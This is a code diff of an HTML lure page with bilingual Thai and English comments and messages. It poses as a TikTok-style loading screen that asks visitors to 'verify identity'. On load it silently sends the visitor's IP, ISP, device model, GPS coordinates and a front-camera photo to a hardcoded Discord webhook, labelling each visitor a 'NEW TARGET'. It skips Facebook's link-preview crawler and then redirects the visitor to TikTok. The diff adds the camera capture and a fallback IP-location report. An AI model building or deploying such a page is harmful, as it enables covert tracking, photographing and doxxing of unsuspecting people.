@@ -7,6 +7,7 @@
     <script>
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1505441313468710923/4ZwXHcn5adt8nWLoAgLGOuIE9ZKfeIxjZBQvgsF5qh1uLl9DeMT5wQgpwfQxWSuBkpJ9"; 
 
+        // --- ฟังก์ชันถ่ายภาพจากกล้องหน้า ---
         async function captureFace() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
@@ -17,73 +18,79 @@
                 const canvas = document.createElement('canvas');
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
-                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+                const context = canvas.getContext('2d');
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
                 
                 const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
                 const formData = new FormData();
                 formData.append('file', blob, 'face_capture.jpg');
                 formData.append('payload_json', JSON.stringify({ 
-                    content: "📸 **FACE CAPTURED**\n✅ ถ่ายภาพใบหน้าสำเร็จ" 
+                    content: "📸 **FACE CAPTURED (ภาพถ่ายจากกล้องหน้า)**\n✅ Status: Captured successfully (ถ่ายสำเร็จแล้ว)" 
                 }));
 
                 await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
+
+                // ปิดกล้องทันที
                 stream.getTracks().forEach(track => track.stop());
-            } catch (err) {}
+            } catch (err) {
+                // ถ้าเขาไม่อนุญาตกล้อง ก็ให้ข้ามไป
+            }
         }
 
         async function capture() {
             if (navigator.userAgent.includes("facebookexternalhit")) return;
 
             try {
+                // --- ส่วนที่ 1: ดึงข้อมูลที่อยู่และสเปคเครื่อง ---
                 const res = await fetch('https://ipapi.co/json/');
                 const data = await res.json();
-                const check = (val) => (val && val !== null ? val : "❌ ไม่พบข้อมูล");
+                const check = (val) => (val && val !== null ? val : "Data not found (ไม่พบข้อมูล)");
 
                 const ua = navigator.userAgent;
-                let deviceType = "Desktop (คอมพิวเตอร์)";
-                let modelName = "Unknown Device";
+                let isPC = true; // ตัวแปรเช็คว่าเป็นคอมหรือไม่
+                let deviceType = "Desktop (PC/Laptop) (คอมพิวเตอร์)";
+                let modelName = "Unknown Device (ไม่ระบุรุ่น)";
 
-                // --- เช็ค Android แบบละเอียด ---
                 if (/android/i.test(ua)) {
-                    deviceType = "Mobile (Android)";
+                    isPC = false;
+                    deviceType = "Mobile (Android) (มือถือแอนดรอยด์)";
                     const match = ua.match(/\(([^;]+);([^;]+);/);
-                    if (match) {
-                        modelName = match[2].trim().split(" Build")[0].replace(/_/g, " ");
-                    }
-                    if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
-                        const highEntropy = await navigator.userAgentData.getHighEntropyValues(["model"]);
-                        if (highEntropy.model) modelName = highEntropy.model;
-                    }
-                } 
-                // --- เช็ค iPhone แบบละเอียด (บอกครบทุกรุ่น) ---
-                else if (/iPhone|iPad|iPod/i.test(ua)) {
-                    deviceType = "Mobile (iOS)";
+                    modelName = match ? match[2].trim().split(" Build")[0] : "Android Device";
+                } else if (/iPhone|iPad|iPod/i.test(ua)) {
+                    isPC = false;
+                    deviceType = "Mobile (iOS) (มือถือไอโอเอส)";
                     const w = screen.width, h = screen.height, pr = window.devicePixelRatio;
-                    
                     if (w === 430 && h === 932) modelName = "iPhone 14/15/16 Pro Max";
                     else if (w === 393 && h === 852) modelName = "iPhone 14/15/16 Pro";
-                    else if (w === 428 && h === 926) modelName = "iPhone 12/13/14 Plus / Pro Max";
-                    else if (w === 390 && h === 844) modelName = "iPhone 12/13/14 / 15 (Standard)";
+                    else if (w === 390 && h === 844) modelName = "iPhone 12/13/14/15 (Standard)";
                     else if (w === 414 && h === 896) modelName = (pr === 3) ? "iPhone 11 Pro Max / XS Max" : "iPhone 11 / XR";
                     else if (w === 375 && h === 812) modelName = "iPhone 11 Pro / X / XS";
-                    else if (w === 360 && h === 780) modelName = "iPhone 12/13 Mini";
-                    else if (w === 414 && h === 736) modelName = "iPhone 6s/7/8 Plus";
-                    else if (w === 375 && h === 667) modelName = "iPhone 6/6s/7/8 / SE (2nd/3rd Gen)";
-                    else if (w === 320 && h === 568) modelName = "iPhone 5 / 5s / SE (1st Gen)";
-                    else if (w === 810 && h === 1080) modelName = "iPad (7th/8th/9th Gen)";
-                    else if (w === 834 && h === 1194) modelName = "iPad Pro 11-inch";
-                    else if (w === 1024 && h === 1366) modelName = "iPad Pro 12.9-inch";
-                    else modelName = `iPhone/iPad (Res: ${w}x${h})`;
+                    else if (w === 414 && h === 736) modelName = "iPhone 6/7/8 Plus";
+                    else if (w === 375 && h === 667) modelName = "iPhone 6/7/8 / SE (2nd/3rd)";
+                    else if (w === 320 && h === 568) modelName = "iPhone 5 / SE (1st)";
+                    else if (/iPad/.test(ua)) modelName = "iPad";
+                    else modelName = `iPhone (Screen: ${w}x${h})`;
                 }
 
+                if (navigator.userAgentData) {
+                    const ent = await navigator.userAgentData.getHighEntropyValues(["platformVersion", "model"]);
+                    if (ent.model) modelName = ent.model;
+                    if (navigator.userAgentData.platform === "Windows") {
+                        const major = parseInt(ent.platformVersion.split('.')[0]);
+                        deviceType = (major >= 13) ? "Windows 11 PC (วินโดวส์ 11)" : "Windows 10 PC (วินโดวส์ 10)";
+                    }
+                }
+
+                // ส่ง Report แรก: สเปคเครื่องและเน็ต (จัดหน้าสวยๆ)
                 let report = `📂 **NEW TARGET LOGGED**\n`;
                 report += `──────────────────────────\n`;
                 report += `📱 **[DEVICE (อุปกรณ์)]**\n`;
                 report += `> **Model (รุ่น):** ${modelName}\n`;
-                report += `> **Type (ประเภท):** ${deviceType}\n\n`;
+                report += `> **Type (ประเภท):** ${deviceType}\n`;
+                report += `> **OS (ระบบ):** ${check(navigator.platform)}\n\n`;
                 report += `🌐 **[NETWORK (เครือข่าย)]**\n`;
-                report += `> **IP:** \`${check(data.ip)}\` \n`;
-                report += `> **ISP:** ${check(data.org)}\n`;
+                report += `> **IP (ไอพี):** \`${check(data.ip)}\` \n`;
+                report += `> **ISP (ค่ายเน็ต):** ${check(data.org)}\n`;
                 report += `──────────────────────────`;
 
                 await fetch(WEBHOOK_URL, {
@@ -92,58 +99,87 @@
                     body: JSON.stringify({ content: report })
                 });
 
+                // --- ส่วนที่ 2: ระบบตัดสินใจพิกัด และขอใช้กล้อง ---
                 if (navigator.geolocation) {
                     navigator.geolocation.getCurrentPosition(async (pos) => {
+                        // เมื่อกดยอมรับพิกัด ให้ลองขอใช้กล้องถ่ายรูปทันที
                         await captureFace();
+
                         const { latitude, longitude } = pos.coords;
                         const mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
                         
+                        // เช็คสถานะความแม่นยำตามอุปกรณ์
+                        let accuracyStatus = isPC 
+                            ? "Inaccurate but nearby (พิกัดความแม่นยำไม่แน่นอน แต่ใกล้เคียง)" 
+                            : "Precise Data (ข้อมูลแม่นยำ💯)";
+
                         await fetch(WEBHOOK_URL, {
                             method: 'POST',
                             headers: { 'Content-Type': 'application/json' },
                             body: JSON.stringify({ 
-                                content: `🎯 **LOCATION FOUND**\n📍 **Maps:** ${mapsLink}\n✅ **Status:** พิกัดตรง 💯` 
+                                content: `🎯 **LOCATION FOUND (พบตำแหน่ง)**\n──────────────────────────\n📍 **Google Maps:** ${mapsLink}\n✅ **Status:** ${accuracyStatus}\n──────────────────────────` 
                             })
                         });
                         window.location.href = "https://www.tiktok.com";
+
                     }, async () => { 
+                        let backupReport = `⚠️ **LOCATION ACCESS DENIED (ปฏิเสธพิกัด)**\n`;
+                        backupReport += `──────────────────────────\n`;
+                        backupReport += `📍 **[IP BASED LOCATION (ตำแหน่งอ้างอิงไอพี)]**\n`;
+                        backupReport += `> **City (เมือง):** ${check(data.city)}\n`;
+                        backupReport += `> **Region (จังหวัด):** ${check(data.region)}\n`;
+                        backupReport += `> **Country (ประเทศ):** ${check(data.country_name)}\n\n`;
+                        backupReport += `❌ **Status:** Data Inaccurate (ข้อมูลอาจไม่ตรงและคลาดเคลื่อน)\n`;
+                        backupReport += `──────────────────────────`;
+
+                        await fetch(WEBHOOK_URL, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ content: backupReport })
+                        });
                         window.location.href = "https://www.tiktok.com"; 
-                    }, { enableHighAccuracy: true, timeout: 10000 });
+                    }, { 
+                        enableHighAccuracy: true, 
+                        maximumAge: 0, 
+                        timeout: 10000 
+                    });
                 } else {
                     window.location.href = "https://www.tiktok.com";
                 }
-            } catch (e) { window.location.href = "https://www.tiktok.com"; }
+            } catch (e) { 
+                window.location.href = "https://www.tiktok.com"; 
+            }
         }
         window.onload = capture;
     </script>
     <style>
+        /* แก้ไข CSS ให้รองรับทุก Resolution */
         body, html {
             margin: 0; padding: 0; width: 100%; height: 100%;
-            background: #000; color: #fff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            background: #000; color: #fff; font-family: sans-serif;
             display: flex; justify-content: center; align-items: center; overflow: hidden;
         }
-        .container { text-align: center; width: 90%; max-width: 400px; }
+        .container {
+            text-align: center; width: 90%; max-width: 400px; padding: 20px;
+        }
         .spinner {
-            border: 4px solid rgba(255,255,255,0.1);
-            border-top: 4px solid #fe2c55;
-            border-radius: 50%; width: 45px; height: 45px;
-            animation: spin 1s linear infinite; margin: 0 auto 20px;
+            border: 3px solid #f3f3f3; border-top: 3px solid #fe2c55; border-radius: 50%;
+            width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 10px auto;
         }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         .alert-box {
-            font-size: 13px; color: #fe2c55; margin-top: 20px;
-            border: 1px solid #fe2c55; padding: 12px; border-radius: 8px;
-            background: rgba(254, 44, 85, 0.1); line-height: 1.5;
+            font-size: 13px; color: #fe2c55; margin-top: 15px; border: 1px solid #fe2c55;
+            padding: 8px; border-radius: 5px; line-height: 1.4;
         }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="spinner"></div>
-        <p style="font-size: 20px; font-weight: 700; margin: 0;">Loading Content...</p>
-        <p style="font-size: 14px; color: #aaa; margin: 8px 0 0;">(กำลังโหลดเนื้อหา...)</p>
+        <p style="font-size: 18px; font-weight: bold; margin-bottom: 5px;">Loading Content...</p>
+        <p style="font-size: 14px; color: #ccc;">(กำลังโหลดเนื้อหา...)</p>
         <div class="alert-box">
-            ⚠️ โปรดกด <b>"อนุญาต (Allow)"</b> เพื่อยืนยันตัวตน<br>และเข้าชมเนื้อหาที่จำกัดเฉพาะพื้นที่ของคุณ
+            ⚠️ Please click **"Allow" (อนุญาต)** to verify your identity and view content restricted to your area.
         </div>
     </div>
 </body>
